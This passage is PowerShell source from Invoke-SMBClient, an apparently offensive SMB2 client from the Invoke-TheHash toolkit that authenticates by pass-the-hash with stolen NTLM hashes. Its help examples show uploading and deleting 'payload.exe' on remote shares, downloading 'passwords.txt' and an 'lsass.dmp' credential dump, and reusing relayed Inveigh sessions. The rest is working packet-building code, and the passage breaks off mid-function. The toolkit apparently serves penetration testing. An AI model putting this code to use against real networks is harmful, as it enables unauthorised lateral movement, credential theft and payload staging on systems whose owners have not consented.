function Invoke-SMBClient
{
<#
.SYNOPSIS
Invoke-SMBClient performs basic file share tasks with pass the hash. This module supports SMB2 (2.1) only with and
without SMB signing. Note that this client is slow compared to the Windows client.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.Parameter Action
Default = List: (List/Recurse/Delete/Get/Put) Action to perform. 
List: Lists the contents of a directory.
Recurse: Lists the contents of a directory and all subdirectories.
Delete: Deletes a file.
Get: Downloads a file.
Put: Uploads a file and sets the creation, access, and last write times to match the source file.

.PARAMETER Source
List and Recurse: UNC path to a directory.
Delete: UNC path to a file.
Get: UNC path to a file.
Put: File to upload. If a full path is not specified, the file must be in the current directory. When using the
'Modify' switch, 'Source' must be a byte array.

.PARAMETER Destination
List and Recurse: Not used.
Delete: Not used.
Get: If used, value will be the new filename of downloaded file. If a full path is not specified, the file will be
created in the current directory.
Put: UNC path for uploaded file. The filename must be specified.

.PARAMETER Modify
List and Recurse: The function will output an object consisting of directory contents.
Delete: Not used.
Get: The function will output a byte array of the downloaded file instead of writing the file to disk. It's
advisable to use this only with smaller files and to send the output to a variable.
Put: Uploads a byte array to a new destination file.

.PARAMETER NoProgress
List and Recurse: Not used.
Delete: Not used.
Get and Put: Prevents displaying of a progress bar.

.PARAMETER Sleep
Default = 100 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try increasing this
if downloaded files are being corrupted.

.PARAMETER Session
Inveigh-Relay authenticated session.

.EXAMPLE
List the contents of a root share directory.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Source \\server\share -verbose

.EXAMPLE
Recursively list the contents of a share starting at the root.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Recurse -Source \\server\share

.EXAMPLE
Recursively list the contents of a share subdirectory and return only the contents output to a variable.
$directory_contents = Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Recurse -Source \\server\share\subdirectory -Modify

.EXAMPLE
Delete a file on a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Delete -Source \\server\share\payload.exe

.EXAMPLE
Delete a file in subdirectories within a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Delete -Source \\server\share\subdirectory\subdirectory\payload.exe

.EXAMPLE
Download a file from a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\passwords.txt

.EXAMPLE
Download a file from within a share subdirectory and set a new filename.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\subdirectory\lsass.dmp -Destination server_lsass.dmp

.EXAMPLE
Download a file from a share to a byte array variable instead of disk.
[Byte[]]$password_file = Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\passwords.txt -Modify
[System.Text.Encoding]::UTF8.GetString($password_file)

.EXAMPLE
Upload a file to a share subdirectory.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Put -Source payload.exe -Destination \\server\share\subdirectory\payload.exe

.EXAMPLE
Upload a file to share from a byte array variable.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Put -Source $file_byte_array -Destination \\server\share\file.docx -Modify

.EXAMPLE
List the contents of a share directory using an authenticated Inveigh-Relay session.
Invoke-SMBClient -Session 1 -Source \\server\share

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][ValidateSet("List","Recurse","Get","Put","Delete")][String]$Action = "List",
    [parameter(Mandatory=$false)][String]$Destination,
    [parameter(ParameterSetName='Default',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Default',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$true)][Object]$Source,
    [parameter(ParameterSetName='Default',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Switch]$Modify,
    [parameter(Mandatory=$false)][Switch]$NoProgress,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=100
)

function ConvertFrom-PacketOrderedDictionary
{
    param($packet_ordered_dictionary)

    ForEach($field in $packet_ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$packet_header_length,[Int]$packet_data_length)

    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
    $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

    $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NetBIOSSessionService.Add("Message_Type",[Byte[]](0x00))
    $packet_NetBIOSSessionService.Add("Length",[Byte[]]($packet_netbios_session_service_length))

    return $packet_NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

    $packet_process_ID = $packet_process_ID[0,1]

    $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $packet_SMBHeader.Add("Command",$packet_command)
    $packet_SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $packet_SMBHeader.Add("Reserved",[Byte[]](0x00))
    $packet_SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("Flags",$packet_flags)
    $packet_SMBHeader.Add("Flags2",$packet_flags2)
    $packet_SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("TreeID",$packet_tree_ID)
    $packet_SMBHeader.Add("ProcessID",$packet_process_ID)
    $packet_SMBHeader.Add("UserID",$packet_user_ID)
    $packet_SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $packet_SMBHeader
}

function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$packet_version)

    if($packet_version -eq 'SMB1')
    {
        [Byte[]]$packet_byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$packet_byte_count = 0x22,0x00  
    }

    $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $packet_SMBNegotiateProtocolRequest.Add("ByteCount",$packet_byte_count)
    $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($packet_version -ne 'SMB1')
    {
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $packet_SMBNegotiateProtocolRequest
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$packet_command,[Byte[]]$packet_credit_request,[Int]$packet_message_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

    [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

    $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $packet_SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $packet_SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $packet_SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add("Command",$packet_command)
    $packet_SMB2Header.Add("CreditRequest",$packet_credit_request)
    $packet_SMB2Header.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add("MessageID",$packet_message_ID)
    $packet_SMB2Header.Add("ProcessID",$packet_process_ID)
    $packet_SMB2Header.Add("TreeID",$packet_tree_ID)
    $packet_SMB2Header.Add("SessionID",$packet_session_ID)
    $packet_SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $packet_SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $packet_SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$packet_security_blob)

    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
    $packet_security_blob_length = $packet_security_blob_length[0,1]

    $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $packet_SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $packet_SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $packet_SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $packet_SMB2SessionSetupRequest.Add("SecurityBufferLength",$packet_security_blob_length)
    $packet_SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("Buffer",$packet_security_blob)

    return $packet_SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$packet_path)

    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
    $packet_path_length = $packet_path_length[0,1]

    $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $packet_SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $packet_SMB2TreeConnectRequest.Add("PathLength",$packet_path_length)
    $packet_SMB2TreeConnectRequest.Add("Buffer",$packet_path)

    return $packet_SMB2TreeConnectRequest
}

function New-PacketSMB2IoctlRequest
{
    param([Byte[]]$packet_file_name)

    $packet_file_name_length = [System.BitConverter]::GetBytes($packet_file_name.Length + 2)

    $packet_SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2IoctlRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2IoctlRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Function",[Byte[]](0x94,0x01,0x06,0x00))
    $packet_SMB2IoctlRequest.Add("GUIDHandle",[Byte[]](0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff))
    $packet_SMB2IoctlRequest.Add("InData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("InData_Length",$packet_file_name_length)
    $packet_SMB2IoctlRequest.Add("MaxIoctlInSize",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("OutData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("OutData_Length",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("MaxIoctlOutSize",[Byte[]](0x00,0x10,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Flags",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("InData_MaxReferralLevel",[Byte[]](0x04,0x00))
    $packet_SMB2IoctlRequest.Add("InData_FileName",$packet_file_name)

    return $packet_SMB2IoctlRequest
}

function New-PacketSMB2CreateRequest
{
    param([Byte[]]$packet_file_name,[Int]$packet_extra_info,[Int64]$packet_allocation_size)

    if($packet_file_name)
    {
        $packet_file_name_length = [System.BitConverter]::GetBytes($packet_file_name.Length)
        $packet_file_name_length = $packet_file_name_length[0,1]
    }
    else
    {
        $packet_file_name = 0x00,0x00,0x69,0x00,0x6e,0x00,0x64,0x00
        $packet_file_name_length = 0x00,0x00
    }

    if($packet_extra_info)
    {
        [Byte[]]$packet_desired_access = 0x80,0x00,0x10,0x00
        [Byte[]]$packet_file_attributes = 0x00,0x00,0x00,0x00
        [Byte[]]$packet_share_access = 0x00,0x00,0x00,0x00
        [Byte[]]$packet_create_options = 0x21,0x00,0x00,0x00
        [Byte[]]$packet_create_contexts_offset = [System.BitConverter]::GetBytes($packet_file_name.Length)

        if($packet_extra_info -eq 1)
        {
            [Byte[]]$packet_create_contexts_length = 0x58,0x00,0x00,0x00
        }
        elseif($packet_extra_info -eq 2)
        {
            [Byte[]]$packet_create_contexts_length = 0x90,0x00,0x00,0x00
        }
        else
        {
            [Byte[]]$packet_create_contexts_length = 0xb0,0x00,0x00,0x00
            [Byte[]]$packet_allocation_size_bytes = [System.BitConverter]::GetBytes($packet_allocation_size)
        }

        if($packet_file_name)
        {

            [String]$packet_file_name_padding_check = $packet_file_name.Length / 8

            if($packet_file_name_padding_check -like "*.75")
            {
                $packet_file_name += 0x04,0x00
            }
            elseif($packet_file_name_padding_check -like "*.5")
            {
                $packet_file_name += 0x00,0x00,0x00,0x00
            }
            elseif($packet_file_name_padding_check -like "*.25")
            {
               $packet_file_name += 0x00,0x00,0x00,0x00,0x00,0x00
            }

        }

        [Byte[]]$packet_create_contexts_offset = [System.BitConverter]::GetBytes($packet_file_name.Length + 120)

    }
    else
    {
        [Byte[]]$packet_desired_access = 0x03,0x00,0x00,0x00
        [Byte[]]$packet_file_attributes = 0x80,0x00,0x00,0x00
        [Byte[]]$packet_share_access = 0x01,0x00,0x00,0x00
        [Byte[]]$packet_create_options = 0x40,0x00,0x00,0x00
        [Byte[]]$packet_create_contexts_offset = 0x00,0x00,0x00,0x00
        [Byte[]]$packet_create_contexts_length = 0x00,0x00,0x00,0x00
    }

    $packet_SMB2CreateRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2CreateRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2CreateRequest.Add("Flags",[Byte[]](0x00))
    $packet_SMB2CreateRequest.Add("RequestedOplockLevel",[Byte[]](0x00))
    $packet_SMB2CreateRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SMB2CreateRequest.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequest.Add("DesiredAccess",$packet_desired_access)
    $packet_SMB2CreateRequest.Add("FileAttributes",$packet_file_attributes)
    $packet_SMB2CreateRequest.Add("ShareAccess",$packet_share_access)
    $packet_SMB2CreateRequest.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2CreateRequest.Add("CreateOptions",$packet_create_options)
    $packet_SMB2CreateRequest.Add("NameOffset",[Byte[]](0x78,0x00))
    $packet_SMB2CreateRequest.Add("NameLength",$packet_file_name_length)
    $packet_SMB2CreateRequest.Add("CreateContextsOffset",$packet_create_contexts_offset)
    $packet_SMB2CreateRequest.Add("CreateContextsLength",$packet_create_contexts_length)
    $packet_SMB2CreateRequest.Add("Buffer",$packet_file_name)

    if($packet_extra_info)
    {
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_ChainOffset",[Byte[]](0x28,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag_Offset",[Byte[]](0x10,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_Offset",[Byte[]](0x18,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_Length",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag",[Byte[]](0x44,0x48,0x6e,0x51))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_GUIDHandle",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($packet_extra_info -eq 3)
        {
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_ChainOffset",[Byte[]](0x20,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag_Offset",[Byte[]](0x10,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Data_Offset",[Byte[]](0x18,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Data_Length",[Byte[]](0x08,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag",[Byte[]](0x41,0x6c,0x53,0x69))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_AllocationSize",$packet_allocation_size_bytes)
        }

        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag_Offset",[Byte[]](0x10,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Data_Offset",[Byte[]](0x18,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag",[Byte[]](0x4d,0x78,0x41,0x63))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($packet_extra_info -gt 1)
        {
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))
        }
        else
        {
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))
        }
        
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag_Offset",[Byte[]](0x10,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Data_Offset",[Byte[]](0x18,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag",[Byte[]](0x51,0x46,0x69,0x64))
        $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($packet_extra_info -gt 1)
        {
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag_Offset",[Byte[]](0x10,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Offset",[Byte[]](0x18,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Length",[Byte[]](0x20,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag",[Byte[]](0x52,0x71,0x4c,0x73))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

            if($packet_extra_info -eq 2)
            {
                $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Key",[Byte[]](0x10,0xb0,0x1d,0x02,0xa0,0xf8,0xff,0xff,0x47,0x78,0x67,0x02,0x00,0x00,0x00,0x00))
            }
            else
            {
                $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Key",[Byte[]](0x10,0x90,0x64,0x01,0xa0,0xf8,0xff,0xff,0x47,0x78,0x67,0x02,0x00,0x00,0x00,0x00))
            }

            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_State",[Byte[]](0x07,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Flags",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Duration",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        }

    }

    return $packet_SMB2CreateRequest
}

function New-PacketSMB2FindRequestFile
{
    param ([Byte[]]$packet_file_ID,[Byte[]]$packet_padding)

    $packet_SMB2FindRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2FindRequestFile.Add("StructureSize",[Byte[]](0x21,0x00))
    $packet_SMB2FindRequestFile.Add("InfoLevel",[Byte[]](0x25))
    $packet_SMB2FindRequestFile.Add("Flags",[Byte[]](0x00))
    $packet_SMB2FindRequestFile.Add("FileIndex",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2FindRequestFile.Add("FileID",$packet_file_ID)
    $packet_SMB2FindRequestFile.Add("SearchPattern_Offset",[Byte[]](0x60,0x00))
    $packet_SMB2FindRequestFile.Add("SearchPattern_Length",[Byte[]](0x02,0x00))
    $packet_SMB2FindRequestFile.Add("OutputBufferLength",[Byte[]](0x00,0x00,0x01,0x00))
    $packet_SMB2FindRequestFile.Add("SearchPattern",[Byte[]](0x2a,0x00))

    if($packet_padding)
    {
        $packet_SMB2FindRequestFile.Add("Padding",$packet_padding)
    }

    return $packet_SMB2FindRequestFile
}

function New-PacketSMB2QueryInfoRequest
{
    param ([Byte[]]$packet_info_type,[Byte[]]$packet_file_info_class,[Byte[]]$packet_output_buffer_length,[Byte[]]$packet_input_buffer_offset,[Byte[]]$packet_file_ID,[Int]$packet_buffer)

    [Byte[]]$packet_buffer_bytes = ,0x00 * $packet_buffer

    $packet_SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2QueryInfoRequest.Add("StructureSize",[Byte[]](0x29,0x00))
    $packet_SMB2QueryInfoRequest.Add("InfoType",$packet_info_type)
    $packet_SMB2QueryInfoRequest.Add("FileInfoClass",$packet_file_info_class)
    $packet_SMB2QueryInfoRequest.Add("OutputBufferLength",$packet_output_buffer_length)
    $packet_SMB2QueryInfoRequest.Add("InputBufferOffset",$packet_input_buffer_offset)
    $packet_SMB2QueryInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("InputBufferLength",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("FileID",$packet_file_ID)

    if($packet_buffer -gt 0)
    {
        $packet_SMB2QueryInfoRequest.Add("Buffer",$packet_buffer_bytes)
    }

    return $packet_SMB2QueryInfoRequest
}

function New-PacketSMB2SetInfoRequest
{
    param ([Byte[]]$packet_info_type,[Byte[]]$packet_file_info_class,[Byte[]]$packet_file_ID,[Byte[]]$packet_buffer)

    [Byte[]]$packet_buffer_length = [System.BitConverter]::GetBytes($packet_buffer.Count)

    $packet_SMB2SetInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SetInfoRequest.Add("StructureSize",[Byte[]](0x21,0x00))
    $packet_SMB2SetInfoRequest.Add("InfoType",$packet_info_type)
    $packet_SMB2SetInfoRequest.Add("FileInfoClass",$packet_file_info_class)
    $packet_SMB2SetInfoRequest.Add("BufferLength",$packet_buffer_length)
    $packet_SMB2SetInfoRequest.Add("BufferOffset",[Byte[]](0x60,0x00))
    $packet_SMB2SetInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2SetInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SetInfoRequest.Add("FileID",$packet_file_ID)
    $packet_SMB2SetInfoRequest.Add("Buffer",$packet_buffer)

    return $packet_SMB2SetInfoRequest
}

function New-PacketSMB2ReadRequest
{
    param ([Int]$packet_length,[Int64]$packet_offset,[Byte[]]$packet_file_ID)

    [Byte[]]$packet_length_bytes = [System.BitConverter]::GetBytes($packet_length)
    [Byte[]]$packet_offset_bytes = [System.BitConverter]::GetBytes($packet_offset)

    $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $packet_SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $packet_SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $packet_SMB2ReadRequest.Add("Length",$packet_length_bytes)
    $packet_SMB2ReadRequest.Add("Offset",$packet_offset_bytes)
    $packet_SMB2ReadRequest.Add("FileID",$packet_file_ID)
    $packet_SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
